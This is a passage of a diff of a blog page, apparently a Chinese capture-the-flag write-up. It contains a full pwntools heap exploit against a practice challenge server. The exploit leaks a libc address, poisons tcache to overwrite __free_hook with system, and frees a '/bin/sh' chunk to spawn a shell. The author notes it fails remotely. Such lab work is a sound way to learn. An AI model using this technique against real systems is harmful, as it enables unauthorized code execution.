+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = process(address)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">28721</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;len:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;content:&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span><span class="n">idx2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx1:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;idx2:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 首先泄露libc 等下把下面这个0x31改成0x41就可以泄露libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xf</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="c1">#这个是first_3的size</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span> <span class="c1">#0</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span> <span class="c1">#1</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c1">#2</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;d&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c1">#first_3</span>
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#2   #这样就把3的大小改了</span>
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;e&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c1">#second_3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 填满128的tcache</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;tcache&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#这个堆块用于防止consolidate</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;zhanwei&#39;</span><span class="p">)</span> <span class="c1">#11</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">11</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dele</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#进入unsorted</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#3</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc_addr = 0x</span><span class="si">%x</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">libc_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#这里把破坏的堆结构改回来,不然接下来申请堆块的时候会报错</span>
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#这个chunk大小为0x41</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span> <span class="c1">#3</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#然后把tcahce中的堆块申请出来</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;f&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># 4-10</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># #申请出来unsorted中的堆块</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;f&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>  <span class="c1">#12</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#再把tcache的free回去</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">11</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dele</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#现在4-10为空</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span>  <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="o">*</span><span class="mh">0xf</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span> <span class="c1">#这个是first_3的size</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span> <span class="c1">#0  4</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="o">*</span><span class="mh">0x18</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span> <span class="c1">#1  5</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;merge_chunk&#39;</span><span class="p">)</span><span class="c1">#2 6</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;size be writed chunk&#39;</span><span class="p">)</span> <span class="c1">#3 7</span>
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span> <span class="c1">#2 #size be writed</span>
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1">#size 0x50</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;tcache&#39;</span><span class="p">)</span><span class="c1">#3 7</span>
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;x&#39;</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span> <span class="c1">#3 7</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="c1">#4 8</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span> <span class="c1">#5 9</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>不知道为啥远程不通</p>
+</blockquote></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
